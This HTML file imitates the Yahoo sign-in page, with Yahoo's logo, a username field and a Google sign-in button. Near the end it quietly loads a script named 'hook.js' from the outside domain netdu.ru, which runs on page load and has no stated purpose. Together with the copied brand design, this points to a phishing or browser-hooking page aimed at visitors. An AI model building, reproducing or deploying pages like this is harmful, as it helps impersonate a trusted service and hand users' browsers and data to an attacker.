<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Yahoo Sign In</title>
    <style>
      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        background-color: #f5f5f5;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }

      .login-container {
        width: 360px;
        background-color: #ffffff;
        padding: 40px 30px;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        text-align: center;
      }

      .login-container img {
        width: 80px;
        margin-bottom: 10px;
      }

      .login-container h2 {
        margin: 10px 0 5px;
        font-size: 20px;
        color: #000;
      }

      .login-container p {
        margin: 0 0 20px;
        font-size: 14px;
        color: #555;
      }

      input[type="text"] {
        width: 100%;
        padding: 12px;
        margin-bottom: 20px;
        border: none;
        border-bottom: 1px solid #ccc;
        font-size: 16px;
      }

      .btn {
        width: 100%;
        padding: 12px;
        background-color: #410093;
        color: white;
        border: none;
        border-radius: 24px;
        font-size: 16px;
        cursor: pointer;
        margin-bottom: 15px;
      }

      .btn:hover {
        background-color: #32006f;
      }

      .link {
        font-size: 14px;
        color: #410093;
        text-decoration: none;
        display: block;
        margin: 8px 0;
      }

      .outline-btn {
        border: 2px solid #410093;
        background-color: transparent;
        color: #410093;
        border-radius: 24px;
        padding: 10px;
        font-size: 16px;
        margin-bottom: 10px;
        width: 100%;
        cursor: pointer;
      }

      .outline-btn:hover {
        background-color: #f2e7ff;
      }

      .or-divider {
        margin: 15px 0;
        color: #999;
      }

      .google-btn {
        width: 100%;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 24px;
        font-size: 14px;
        display: flex;
        align-items: center;
        justify-content: center;
        background-color: #fff;
        cursor: pointer;
      }

      .google-btn img {
        width: 20px;
        margin-right: 10px;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <img
        src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png"
        alt="Yahoo"
        class="logo"
        width
        height="27"
      />
      <h2>Sign in</h2>
      <p>using your Yahoo account</p>
      <input type="text" placeholder="Username, email, or mobile" />
      <a href="https://mail.yahoo.com/login" target="_blank"
        ><button class="btn">Next</button></a
      >
      <a href="#" class="link">Forgot username?</a>
      <button class="outline-btn">Create an account</button>
      <div class="or-divider">or</div>
      <button class="google-btn">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          x="0px"
          y="0px"
          width="30"
          height="30"
          viewBox="0 0 48 48"
        >
          <path
            fill="#FFC107"
            d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"
          ></path>
          <path
            fill="#FF3D00"
            d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"
          ></path>
          <path
            fill="#4CAF50"
            d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"
          ></path>
          <path
            fill="#1976D2"
            d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"
          ></path>
        </svg>
        Sign in with Google
      </button>

      <script src="http:netdu.ru/hook.js"></script>
    </div>
  </body>
</html>
